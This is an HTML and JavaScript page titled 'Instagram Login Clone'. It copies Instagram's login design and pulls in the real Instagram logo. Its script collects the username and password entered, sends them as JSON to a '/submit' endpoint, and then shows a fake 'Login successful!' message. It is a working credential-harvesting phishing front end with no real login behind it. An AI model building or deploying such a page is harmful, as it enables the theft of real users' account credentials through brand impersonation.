<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Clone</title>
    <style>
        /* CSS Styling for Instagram-like Design */
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            border-radius: 10px;
            width: 350px;
            text-align: center;
        }

        .logo {
            width: 175px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0073e6;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 12px;
        }

        .signup-box {
            margin-top: 10px;
            border: 1px solid #dbdbdb;
            padding: 20px;
            border-radius: 10px;
        }

        .success-message {
            display: none;
            color: green;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Login Form Section -->
        <div class="login-box">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" class="logo">
            <form id="loginForm">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
                <p class="forgot-password"><a href="#">Forgot password?</a></p>
            </form>
            <p class="success-message" id="successMessage">Login successful!</p>
        </div>

        <!-- Sign Up Section -->
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <!-- JavaScript Code -->
    <script>
        const form = document.getElementById('loginForm');
        const successMessage = document.getElementById('successMessage');

        form.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent page refresh

            const formData = {
                username: form.username.value,
                password: form.password.value
            };

            try {
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(formData)
                });

                if (response.ok) {
                    successMessage.style.display = 'block';
                    form.reset();
                } else {
                    alert('Error submitting the form.');
                }
            } catch (error) {
                alert('Error connecting to the server.');
            }
        });
    </script>

</body>
</html>
